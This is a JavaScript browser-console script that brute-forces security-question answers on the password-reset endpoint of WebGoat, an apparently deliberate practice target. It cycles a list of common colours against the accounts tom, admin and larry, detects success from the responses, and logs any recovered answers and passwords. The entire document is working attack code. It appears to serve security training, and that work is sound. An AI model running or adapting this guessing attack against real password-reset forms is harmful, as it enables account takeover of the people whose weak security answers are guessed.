// Security Questions Attack - FORM DATA VERSION
// The server expects application/x-www-form-urlencoded, not JSON!

(async function() {
    console.log('===================================================================');
    console.log('SECURITY QUESTIONS BRUTE FORCE ATTACK - FORM DATA VERSION');
    console.log('Endpoint: /WebGoat/PasswordReset/questions');
    console.log('===================================================================');
    
    // Common colors for "What is your favorite color?" question
    const colors = [
        'red', 'blue', 'green', 'yellow', 'orange', 'purple', 'pink',
        'black', 'white', 'gray', 'grey', 'brown', 'cyan', 'magenta',
        'violet', 'indigo', 'turquoise', 'gold', 'silver', 'crimson',
        'navy', 'teal', 'lime', 'maroon', 'olive', 'aqua', 'fuchsia',
        'coral', 'salmon', 'peach', 'mint', 'lavender', 'tan', 'beige',
        'scarlet', 'azure', 'emerald', 'ruby', 'sapphire', 'bronze'
    ];
    
    // Target users
    const users = ['tom', 'admin', 'larry'];
    
    const results = {};
    
    for (const user of users) {
        console.log('\n===================================================================');
        console.log('[*] Attacking user: ' + user);
        console.log('===================================================================');
        
        let found = false;
        
        for (const color of colors) {
            console.log('  [+] Trying: ' + color);
            
            try {
                // Create form data
                const formData = new URLSearchParams();
                formData.append('username', user);
                formData.append('securityQuestion', color);
                
                const response = await fetch('/WebGoat/PasswordReset/questions', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formData.toString()
                });
                
                const data = await response.json();
                  console.log('      Response:', JSON.stringify(data));
                
                // Check for success - only if lessonCompleted is true or feedback contains success/correct
                // Failure messages include: "Sorry the solution is not correct"
                if (data.lessonCompleted === true || 
                    (data.feedback && data.feedback.toLowerCase().includes('success')) ||
                    (data.feedback && data.feedback.toLowerCase().includes('correct') && !data.feedback.toLowerCase().includes('not correct')) ||
                    (data.output && data.output.length > 0)) {
                    
                    console.log('\n');
                    console.log('  ========================================');
                    console.log('  [SUCCESS] Found answer for ' + user + '!');
                    console.log('  ========================================');
                    console.log('  Security Answer: ' + color);
                    console.log('  Response:', JSON.stringify(data, null, 2));
                    
                    results[user] = {
                        answer: color,
                        response: data
                    };
                    
                    found = true;
                    break;
                }
                
                // Small delay to avoid overwhelming server
                await new Promise(resolve => setTimeout(resolve, 100));
                
            } catch (error) {
                console.log('      [ERROR] ' + error.message);
            }
        }
        
        if (!found) {
            console.log('\n  [-] No answer found for ' + user + ' in common colors list');
            results[user] = { answer: 'NOT FOUND', response: null };
        }
    }
    
    console.log('\n\n===================================================================');
    console.log('ATTACK COMPLETED - SUMMARY');
    console.log('===================================================================');
    
    for (const user in results) {
        console.log('\nUser: ' + user);
        if (results[user].answer !== 'NOT FOUND') {
            console.log('  Answer: ' + results[user].answer);
            if (results[user].response.output) {
                console.log('  Password: ' + results[user].response.output);
            }
        } else {
            console.log('  Answer: NOT FOUND');
        }
    }
    
    console.log('\n===================================================================');
    
    // Save results to window for reference
    window.securityQuestionsResults = results;
    console.log('\nResults saved to: window.securityQuestionsResults');
    
})();
